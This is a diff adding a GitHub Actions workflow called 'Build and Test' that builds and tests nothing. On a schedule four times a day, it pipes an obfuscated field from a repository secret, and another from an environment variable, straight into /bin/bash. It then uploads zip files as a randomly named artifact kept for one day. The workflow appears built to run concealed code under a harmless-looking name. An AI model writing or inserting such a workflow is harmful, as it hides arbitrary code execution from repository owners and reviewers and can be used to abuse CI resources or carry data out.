@@ -1,0 +1,32 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '34 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          txv1: ${{ secrets.txv1 }}
+        run: |
+          printf '%s' "$txv1" | jq -r .qtaph81 | /bin/bash
+          echo $ls6456 | jq -r .u7 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: eU9AEnvj
+          path: "*.zip"
+          retention-days: 1
